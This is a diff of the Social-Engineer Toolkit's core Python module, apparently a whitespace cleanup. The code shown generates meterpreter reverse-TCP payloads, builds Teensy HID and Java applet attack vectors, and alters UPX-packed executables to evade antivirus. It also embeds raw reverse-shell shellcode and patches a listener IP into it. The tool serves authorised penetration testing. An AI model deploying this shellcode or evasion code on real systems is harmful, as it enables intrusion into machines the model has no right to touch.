@@ -18,11 +18,11 @@ from src.core import dictionaries
 
 # check to see if we have python-pycrypto
 try:
-        from Crypto.Cipher import AES
+    from Crypto.Cipher import AES
 
 except ImportError:
-        print "[!] The python-pycrypto python module not installed. You will loose the ability for encrypted communications."
-        pass
+    print "[!] The python-pycrypto python module not installed. You will loose the ability for encrypted communications."
+    pass
 
 # used to grab the true path for current working directory
 definepath = os.getcwd()
@@ -78,7 +78,7 @@ if check_os() == "posix":
             self.backCyan = ''
             self.backWhite = ''
             self.DARKCYAN = ''
-                        
+
 # if we are windows or something like that then define colors as nothing
 else:
     class bcolors:
@@ -121,7 +121,7 @@ else:
             self.backWhite = ''
             self.DARKCYAN = ''
 
-# this will be the home for the set menus 
+# this will be the home for the set menus
 def setprompt(category, text):
     # if no special prompt and no text, return plain prompt
     if category == '0' and text == "":
@@ -154,17 +154,17 @@ def setprompt(category, text):
 
 def yesno_prompt(category,text):
     valid_response = False
-    while not valid_response: 
+    while not valid_response:
         response = raw_input(setprompt(category,text))
         response = str.lower(response)
         if response == "no" or response == "n":
-                response = "NO"
-                valid_response = True
+            response = "NO"
+            valid_response = True
         elif response == "yes" or response == "y":
-                response = "YES"
-                valid_response = True
+            response = "YES"
+            valid_response = True
         else:
-                print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
+            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
     return response
 
 def return_continue():
@@ -231,10 +231,10 @@ class create_menu:
         print text
         #print "\nType 'help' for information on this module\n"
         for i, option in enumerate(menu):
-            
+
             menunum = i + 1
             # Check to see if this line has the 'return to main menu' code
-            match = re.search("0D", option) 
+            match = re.search("0D", option)
             # If it's not the return to menu line:
             if not match:
                 if menunum < 10:
@@ -280,10 +280,10 @@ def meta_path():
             # path for metasploit
             trigger = 0
             if not os.path.isdir(msf_path):
-		# specific for kali linux
-		if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
-			msf_path = "/opt/metasploit/apps/pro/msf3/"
-			trigger = 1
+                # specific for kali linux
+                if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
+                    msf_path = "/opt/metasploit/apps/pro/msf3/"
+                    trigger = 1
                 # specific for backtrack5
                 if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                     msf_path = "/opt/framework3/msf3/"
@@ -356,10 +356,10 @@ def grab_ipaddress():
                 rhost = raw_input(setprompt("0", "IP address for the payload listener"))
                 while 1:
                         # check if IP address is valid
-                        ip_check = is_valid_ip(rhost)
-                        if ip_check == False:
-                            rhost = raw_input("[!] Invalid ip address try again: ")
-                        if ip_check == True: break
+                    ip_check = is_valid_ip(rhost)
+                    if ip_check == False:
+                        rhost = raw_input("[!] Invalid ip address try again: ")
+                    if ip_check == True: break
                 return rhost
 
     except Exception, e:
@@ -419,7 +419,7 @@ def check_beautifulsoup():
                     subprocess.Popen("rm -rf BeautifulSoup-*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                     print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                     sys.exit(1)
-    
+
                 if answer == "NO":
                     sys.exit()
                 else:
@@ -464,7 +464,7 @@ def check_mssql():
             else:
                 print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                 sys.exit(1)
-# 
+#
 # cleanup old or stale files
 #
 def cleanup_routine():
@@ -485,7 +485,7 @@ def cleanup_routine():
             os.remove("src/html/index.html")
         if os.path.isfile("src/program_junk/Signed_Update.jar"):
             os.remove("src/program_junk/Signed_Update.jar")
-	#subprocess.Popen("rm -rf src/program_junk/*", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+        #subprocess.Popen("rm -rf src/program_junk/*", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     except:
         pass
 
@@ -582,7 +582,7 @@ def site_cloner(website, exportpath, *args):
 # inherit the AUTO_DETECT=ON or OFF configuration.
 #
 # usage: metasploit_reverse_tcp_exe(portnumber)
-# 
+#
 def meterpreter_reverse_tcp_exe(port):
 
     ipaddr = grab_ipaddress()
@@ -612,7 +612,7 @@ def meterpreter_reverse_tcp_exe(port):
     random_value = generate_random_string(5, 10)
     # copy the created executable to program_junk
     print_status("Executable created under src/program_junk/%s.exe" % (random_value))
-    subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
+    subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 #
 # Start a metasploit multi handler
 #
@@ -690,9 +690,9 @@ def java_applet_attack(website, port, directory):
     filename = check_options("MSF.EXE=")
     if check_options != 0:
     #if os.path.isfile("src/program_junk/rand_gen"):
-	  
-	# move the file to the specified directory and filename
-	subprocess.Popen("cp src/program_junk/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+
+        # move the file to the specified directory and filename
+        subprocess.Popen("cp src/program_junk/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # lastly we need to copy over the signed applet
     subprocess.Popen("cp src/program_junk/Signed_Update.jar %s" % (directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
@@ -727,7 +727,7 @@ def teensy_pde_generator(attack_method):
         filewrite = file("reports/powershell_down.pde", "w")
         teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")
 
-    # if we are doing the attack vector teensy 
+    # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
         filename = file("src/teensy/powershell_reverse.pde", "r")
@@ -741,7 +741,7 @@ def teensy_pde_generator(attack_method):
         filewrite = file("reports/java_applet.pde", "w")
         teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")
 
-    # if we are doing the attack vector teensy 
+    # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
         filename = file("src/teensy/wscript.pde", "r")
@@ -766,7 +766,7 @@ def teensy_pde_generator(attack_method):
     print_status(teensy_string)
 #
 # Expand the filesystem windows directory
-# 
+#
 
 def windows_root():
     return os.environ['WINDIR']
@@ -776,191 +776,191 @@ def windows_root():
 #
 def log(error):
         # open log file only if directory is present (may be out of directory for some reason)
-        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)): 
-                filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
-                filewrite.write("")
-                filewrite.close()
-        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
-                error = str(error)
-                # open file for writing
-                filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "a")
-                # write error message out
-                filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
-                # close the file
-                filewrite.close()
+    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
+        filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
+        filewrite.write("")
+        filewrite.close()
+    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
+        error = str(error)
+        # open file for writing
+        filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "a")
+        # write error message out
+        filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
+        # close the file
+        filewrite.close()
 
 #
 # upx encoding and modify binary
 #
 def upx(path_to_file):
-        # open the set_config
-        fileopen = file("config/set_config", "r")
-        for line in fileopen:
-                line = line.rstrip()
-                match = re.search("UPX_PATH=", line)
-                if match:
-                        upx_path = line.replace("UPX_PATH=", "")
-        
-        # if it isn't there then bomb out
-        if not os.path.isfile(upx_path):
-                print_warning("UPX was not detected. Try configuring the set_config again.")
+    # open the set_config
+    fileopen = file("config/set_config", "r")
+    for line in fileopen:
+        line = line.rstrip()
+        match = re.search("UPX_PATH=", line)
+        if match:
+            upx_path = line.replace("UPX_PATH=", "")
 
-        # if we detect it
-        if os.path.isfile(upx_path):
-                print_info("Packing the executable and obfuscating PE file randomly, one moment.")
-                # packing executable
-                subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                # move it over the old file
-                subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                
-                # random string
-                random_string = generate_random_string(3,3).upper()
+    # if it isn't there then bomb out
+    if not os.path.isfile(upx_path):
+        print_warning("UPX was not detected. Try configuring the set_config again.")
 
-                # 4 upx replace - we replace 4 upx open the file
-                fileopen = file(path_to_file, "rb")
-                filewrite = file("src/program_junk/temp.binary", "wb")
-                
-                # read the file open for data
-                data = fileopen.read()
-                # replace UPX stub makes better evasion for A/V
-                filewrite.write(data.replace("UPX", random_string, 4))
-                filewrite.close()
-                # copy the file over
-                subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-        time.sleep(3)
+    # if we detect it
+    if os.path.isfile(upx_path):
+        print_info("Packing the executable and obfuscating PE file randomly, one moment.")
+        # packing executable
+        subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+        # move it over the old file
+        subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+
+        # random string
+        random_string = generate_random_string(3,3).upper()
+
+        # 4 upx replace - we replace 4 upx open the file
+        fileopen = file(path_to_file, "rb")
+        filewrite = file("src/program_junk/temp.binary", "wb")
+
+        # read the file open for data
+        data = fileopen.read()
+        # replace UPX stub makes better evasion for A/V
+        filewrite.write(data.replace("UPX", random_string, 4))
+        filewrite.close()
+        # copy the file over
+        subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    time.sleep(3)
 
 def show_banner(define_version,graphic):
 
-        if graphic == "1":
-                if check_os() == "posix":
-                        os.system("clear")
-                if check_os() == "windows":
-                        os.system("cls")
-                show_graphic()
-        else:
-                os.system("clear")
-        
-        print bcolors.BLUE + """
-  [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]        
-  [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-  [---]                   Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
-  [---]               Codename: '""" + bcolors.YELLOW + """Headshot""" + bcolors.BLUE + """'               [---]
-  [---]         Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""        [---]
-  [---]         Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""        [---]
-  [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
+    if graphic == "1":
+        if check_os() == "posix":
+            os.system("clear")
+        if check_os() == "windows":
+            os.system("cls")
+        show_graphic()
+    else:
+        os.system("clear")
+
+    print bcolors.BLUE + """
+[---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
+[---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
+[---]                   Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
+[---]               Codename: '""" + bcolors.YELLOW + """Headshot""" + bcolors.BLUE + """'               [---]
+[---]         Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""        [---]
+[---]         Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""        [---]
+[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
 
 """ + bcolors.GREEN+"""     Welcome to the Social-Engineer Toolkit (SET). The one
-      stop shop for all of your social-engineering needs.
-    """ 
-        print bcolors.BLUE + """      Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
-        print bcolors.BOLD + """  The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
+  stop shop for all of your social-engineering needs.
+"""
+    print bcolors.BLUE + """      Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
+    print bcolors.BOLD + """  The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
-        menu = random.randrange(2,10)
-        if menu == 2:
-                print bcolors.YELLOW + r"""
-                         .--.  .--. .-----.
-                        : .--': .--'`-. .-'
-                        `. `. : `;    : :  
-                         _`, :: :__   : :  
-                        `.__.'`.__.'  :_;   """ + bcolors.ENDC
-                return
-    
-        if menu == 3:
-                print bcolors.GREEN + r"""
-                  _______________________________
-                 /   _____/\_   _____/\__    ___/
-                 \_____  \  |    __)_   |    |   
-                 /        \ |        \  |    |   
-                /_______  //_______  /  |____|   
-                        \/         \/            """ + bcolors.ENDC
-                return
-        
-        if menu == 4:
-                print bcolors.BLUE + r"""                                               
-                    :::===  :::===== :::====
-                    :::     :::      :::====
-                     =====  ======     ===  
-                        === ===        ===  
-                    ======  ========   ===  
+    menu = random.randrange(2,10)
+    if menu == 2:
+        print bcolors.YELLOW + r"""
+                 .--.  .--. .-----.
+                : .--': .--'`-. .-'
+                `. `. : `;    : :
+                 _`, :: :__   : :
+                `.__.'`.__.'  :_;   """ + bcolors.ENDC
+        return
+
+    if menu == 3:
+        print bcolors.GREEN + r"""
+          _______________________________
+         /   _____/\_   _____/\__    ___/
+         \_____  \  |    __)_   |    |
+         /        \ |        \  |    |
+        /_______  //_______  /  |____|
+                \/         \/            """ + bcolors.ENDC
+        return
+
+    if menu == 4:
+        print bcolors.BLUE + r"""
+            :::===  :::===== :::====
+            :::     :::      :::====
+             =====  ======     ===
+                === ===        ===
+            ======  ========   ===
 """ + bcolors.ENDC
 
-        if menu == 5:
-                print bcolors.RED + r"""
-                   ..######..########.########
-                   .##....##.##..........##...
-                   .##.......##..........##...
-                   ..######..######......##...
-                   .......##.##..........##...
-                   .##....##.##..........##...
-                   ..######..########....##...  """ + bcolors.ENDC
-                return
+    if menu == 5:
+        print bcolors.RED + r"""
+           ..######..########.########
+           .##....##.##..........##...
+           .##.......##..........##...
+           ..######..######......##...
+           .......##.##..........##...
+           .##....##.##..........##...
+           ..######..########....##...  """ + bcolors.ENDC
+        return
 
-        if menu == 6:
-                print bcolors.PURPLE + r'''
-                 .M"""bgd `7MM"""YMM MMP""MM""YMM 
-                ,MI    "Y   MM    `7 P'   MM   `7 
-                `MMb.       MM   d        MM      
-                  `YMMNq.   MMmmMM        MM      
-                .     `MM   MM   Y  ,     MM      
-                Mb     dM   MM     ,M     MM      
-                P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
-                return
-        
-        if menu == 7:
-                print bcolors.YELLOW + r""" 
-                      ________________________
-                      __  ___/__  ____/__  __/
-                      _____ \__  __/  __  /   
-                      ____/ /_  /___  _  /    
-                      /____/ /_____/  /_/     """ + bcolors.ENDC
-                return
+    if menu == 6:
+        print bcolors.PURPLE + r'''
+         .M"""bgd `7MM"""YMM MMP""MM""YMM
+        ,MI    "Y   MM    `7 P'   MM   `7
+        `MMb.       MM   d        MM
+          `YMMNq.   MMmmMM        MM
+        .     `MM   MM   Y  ,     MM
+        Mb     dM   MM     ,M     MM
+        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
+        return
 
-        if menu == 8:
-                print bcolors.RED + r'''
-                  !\_________________________/!\
-                  !!                         !! \
-                  !! Social-Engineer Toolkit !!  \
-                  !!                         !!  !
-                  !!          Free           !!  !
-                  !!                         !!  !
-                  !!          #hugs          !!  !
-                  !!                         !!  !
-                  !!      By: TrustedSec     !!  /
-                  !!_________________________!! /
-                  !/_________________________\!/
-                     __\_________________/__/!_
-                    !_______________________!/
-                  ________________________
-                 /oooo  oooo  oooo  oooo /!
-                /ooooooooooooooooooooooo/ /
-               /ooooooooooooooooooooooo/ /
-              /C=_____________________/_/''' + bcolors.ENDC
+    if menu == 7:
+        print bcolors.YELLOW + r"""
+              ________________________
+              __  ___/__  ____/__  __/
+              _____ \__  __/  __  /
+              ____/ /_  /___  _  /
+              /____/ /_____/  /_/     """ + bcolors.ENDC
+        return
+
+    if menu == 8:
+        print bcolors.RED + r'''
+          !\_________________________/!\
+          !!                         !! \
+          !! Social-Engineer Toolkit !!  \
+          !!                         !!  !
+          !!          Free           !!  !
+          !!                         !!  !
+          !!          #hugs          !!  !
+          !!                         !!  !
+          !!      By: TrustedSec     !!  /
+          !!_________________________!! /
+          !/_________________________\!/
+             __\_________________/__/!_
+            !_______________________!/
+          ________________________
+         /oooo  oooo  oooo  oooo /!
+        /ooooooooooooooooooooooo/ /
+       /ooooooooooooooooooooooo/ /
+      /C=_____________________/_/''' + bcolors.ENDC
 
 
-        if menu == 9:
-                print bcolors.YELLOW + """
-             01011001011011110111010100100000011100
-             10011001010110000101101100011011000111
-             10010010000001101000011000010111011001
-             10010100100000011101000110111100100000
-             01101101011101010110001101101000001000
-             00011101000110100101101101011001010010
-             00000110111101101110001000000111100101
-             10111101110101011100100010000001101000
-             01100001011011100110010001110011001000
-             00001110100010110100101001001000000101
-             01000110100001100001011011100110101101
-             11001100100000011001100110111101110010
-             00100000011101010111001101101001011011
-             10011001110010000001110100011010000110
-             01010010000001010011011011110110001101
-             10100101100001011011000010110101000101
-             01101110011001110110100101101110011001
-             01011001010111001000100000010101000110
-             11110110111101101100011010110110100101
-             11010000100000001010100110100001110101
-             011001110111001100101010""" + bcolors.ENDC
+    if menu == 9:
+        print bcolors.YELLOW + """
+     01011001011011110111010100100000011100
+     10011001010110000101101100011011000111
+     10010010000001101000011000010111011001
+     10010100100000011101000110111100100000
+     01101101011101010110001101101000001000
+     00011101000110100101101101011001010010
+     00000110111101101110001000000111100101
+     10111101110101011100100010000001101000
+     01100001011011100110010001110011001000
+     00001110100010110100101001001000000101
+     01000110100001100001011011100110101101
+     11001100100000011001100110111101110010
+     00100000011101010111001101101001011011
+     10011001110010000001110100011010000110
+     01010010000001010011011011110110001101
+     10100101100001011011000010110101000101
+     01101110011001110110100101101110011001
+     01011001010111001000100000010101000110
+     11110110111101101100011010110110100101
+     11010000100000001010100110100001110101
+     011001110111001100101010""" + bcolors.ENDC
 
 #
 # identify if set interactive shells are disabled
@@ -970,7 +970,7 @@ def set_check():
     for line in fileopen:
         match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
         # if we turned it off then we return a true else return false
-        if match: 
+        if match:
             return True
         match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
         # return false otherwise
@@ -1027,7 +1027,7 @@ def check_length(choice,max):
                 choice = int(choice)
             # if everythings good return the right choice
             return choice
-        # oops, not a integer 
+        # oops, not a integer
         except Exception:
             counter = 1
 
@@ -1094,7 +1094,7 @@ def is_valid_ipv6(ip):
              |  (?<!:)              #
              |  (?<=:) (?<!::) :    #
              )                      # OR
-         |                          #   A v4 address with NO leading zeros 
+         |                          #   A v4 address with NO leading zeros
             (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
             (?: \.
                 (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
@@ -1135,35 +1135,35 @@ def check_config(param):
 
 # copy files from directory
 def copyfolder(sourcePath, destPath):
-  for root, dirs, files in os.walk(sourcePath):
+    for root, dirs, files in os.walk(sourcePath):
 
     #figure out where we're going
-    dest = destPath + root.replace(sourcePath, '')
-    
-    #if we're in a directory that doesn't exist in the destination folder
-    #then create a new folder
-    if not os.path.isdir(dest):
-        os.mkdir(dest)
-        #print('Directory created at: ' + dest)
+        dest = destPath + root.replace(sourcePath, '')
 
-    #loop through all files in the directory
-    for f in files:
+        #if we're in a directory that doesn't exist in the destination folder
+        #then create a new folder
+        if not os.path.isdir(dest):
+            os.mkdir(dest)
+            #print('Directory created at: ' + dest)
 
-        #compute current (old) & new file locations
-        oldLoc = root + '/' + f
-        newLoc = dest + '/' + f
+        #loop through all files in the directory
+        for f in files:
 
-        if not os.path.isfile(newLoc):
-            try:
-                shutil.copy2(oldLoc, newLoc)
-            except IOError:
-		pass
+            #compute current (old) & new file locations
+            oldLoc = root + '/' + f
+            newLoc = dest + '/' + f
+
+            if not os.path.isfile(newLoc):
+                try:
+                    shutil.copy2(oldLoc, newLoc)
+                except IOError:
+                    pass
 
 
 # this routine will be used to check config options within the set.options
 def check_options(option):
-    # open the directory
-    trigger = 0        
+        # open the directory
+    trigger = 0
     fileopen = file("%s/src/program_junk/set.options" % (definepath), "r").readlines()
     for line in fileopen:
         match = re.search(option, line)
@@ -1171,31 +1171,31 @@ def check_options(option):
             line = line.rstrip()
             line = line.replace('"', "")
             line = line.split("=")
-            return line[1] 
+            return line[1]
             trigger = 1
     if trigger == 0: return trigger
 
 # future home to update one localized set configuration file
 def update_options(option):
         # if the file isn't there write a blank file
-        if not os.path.isfile("%s/src/program_junk/set.options" % (definepath)):
-                filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
-                filewrite.write("")
-                filewrite.close()
-
-	# remove old options
-	fileopen = file("%s/src/program_junk/set.options" % (definepath), "r")
-	old_options = ""
-	for line in fileopen:
-		match = re.search(option, line)
-		if match:
-			line = ""
-		old_options = old_options + line
-        # append to file
+    if not os.path.isfile("%s/src/program_junk/set.options" % (definepath)):
         filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
-        filewrite.write(old_options + "\n" + option + "\n")
+        filewrite.write("")
         filewrite.close()
- 
+
+    # remove old options
+    fileopen = file("%s/src/program_junk/set.options" % (definepath), "r")
+    old_options = ""
+    for line in fileopen:
+        match = re.search(option, line)
+        if match:
+            line = ""
+        old_options = old_options + line
+    # append to file
+    filewrite = file("%s/src/program_junk/set.options" % (definepath), "w")
+    filewrite.write(old_options + "\n" + option + "\n")
+    filewrite.close()
+
 # python socket listener
 def socket_listener(port):
     port = int(port)          # needed integer for port
@@ -1227,10 +1227,10 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
     msf_path = meta_path()
     # generate payload
     if payload2 == "":
-	    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
-    	    data = proc.communicate()[0]
+        proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+        data = proc.communicate()[0]
     else:
-	data = payload2
+        data = payload2
     # start to format this a bit to get it ready
     data = data.replace(";", "")
     data = data.replace(" ", "")
@@ -1298,61 +1298,61 @@ def generate_shellcode(payload,ipaddr,port):
 
 # this will take input for shellcode and do a replace for IP addresses
 def shellcode_replace(ipaddr, port, shellcode):
-	# split up the ip address
-	ip = ipaddr.split('.')
-	# join the ipaddress into hex value spaces still in tact
-	ipaddr = ' '.join((hex(int(i))[2:] for i in ip))
-	# We use a default 255.254.253.252 on all shellcode then replace
-	# 255.254.253.252 --> hex --> ff fe fd fc
-	# 443 = '0x1bb'
-	if port != "443":
-		port = hex(int(port))
-		# hack job in order to get ports into right format
-		# if we are only using three numbers then you have to flux in a zero
-		if len(port) == 5:
-			port = port.replace("0x", "\\x0")
-		else:
-			port = port.replace("0x", "\\x")
-		# here we break the counters down a bit to get the port into the right format
-		counter = 0
-		new_port = ""
-		for a in port:
-			if counter < 4:
-				new_port += a
-			if counter == 4:
-				new_port += "\\x" + a
-				counter = 0
-			counter = counter + 1
-		# redefine the port in hex here
-		port = new_port
-	#ipaddr = "\\x" + ipaddr
-	ipaddr = ipaddr.split(" ")
-	first = ipaddr[0]
-	# split these up to make sure its in the right format
-	if len(first) == 1:
-		first = "0" + first
-	second = ipaddr[1]
-	if len(second) == 1:
-		second = "0" + second
-	third = ipaddr[2]
-	if len(third) == 1:
-		third = "0" + third
-	fourth = ipaddr[3]
-	if len(fourth) == 1:
-		fourth = "0" + fourth
-	# put the ipaddress into the right format
-	ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
-	shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)
-	if port != "443":
-		# getting everything into the right format
-		if len(port) > 4:
-			port = "\\x00" + port
-		# if we are using a low number like 21, 23, etc. 
-		if len(port) == 4:
-			port = "\\x00\\x00" + port
-		shellcode = shellcode.replace(r"\x00\x01\xbb", port)
-	# return shellcode
-	return shellcode
+        # split up the ip address
+    ip = ipaddr.split('.')
+    # join the ipaddress into hex value spaces still in tact
+    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))
+    # We use a default 255.254.253.252 on all shellcode then replace
+    # 255.254.253.252 --> hex --> ff fe fd fc
+    # 443 = '0x1bb'
+    if port != "443":
+        port = hex(int(port))
+        # hack job in order to get ports into right format
+        # if we are only using three numbers then you have to flux in a zero
+        if len(port) == 5:
+            port = port.replace("0x", "\\x0")
+        else:
+            port = port.replace("0x", "\\x")
+        # here we break the counters down a bit to get the port into the right format
+        counter = 0
+        new_port = ""
+        for a in port:
+            if counter < 4:
+                new_port += a
+            if counter == 4:
+                new_port += "\\x" + a
+                counter = 0
+            counter = counter + 1
+        # redefine the port in hex here
+        port = new_port
+    #ipaddr = "\\x" + ipaddr
+    ipaddr = ipaddr.split(" ")
+    first = ipaddr[0]
+    # split these up to make sure its in the right format
+    if len(first) == 1:
+        first = "0" + first
+    second = ipaddr[1]
+    if len(second) == 1:
+        second = "0" + second
+    third = ipaddr[2]
+    if len(third) == 1:
+        third = "0" + third
+    fourth = ipaddr[3]
+    if len(fourth) == 1:
+        fourth = "0" + fourth
+    # put the ipaddress into the right format
+    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
+    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)
+    if port != "443":
+        # getting everything into the right format
+        if len(port) > 4:
+            port = "\\x00" + port
+        # if we are using a low number like 21, 23, etc.
+        if len(port) == 4:
+            port = "\\x00\\x00" + port
+        shellcode = shellcode.replace(r"\x00\x01\xbb", port)
+    # return shellcode
+    return shellcode
 
 # exit routine
 def exit_set():
@@ -1363,59 +1363,59 @@ def exit_set():
 
 # these are payloads that are callable
 def metasploit_shellcode(payload):
-	counter = 0
-	if payload == "windows/meterpreter/reverse_tcp":
-		# shellcode for meterpreter reverse_tcp
-		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
-		counter = 1
-	if payload == "windows/x64/meterpreter/reverse_tcp":
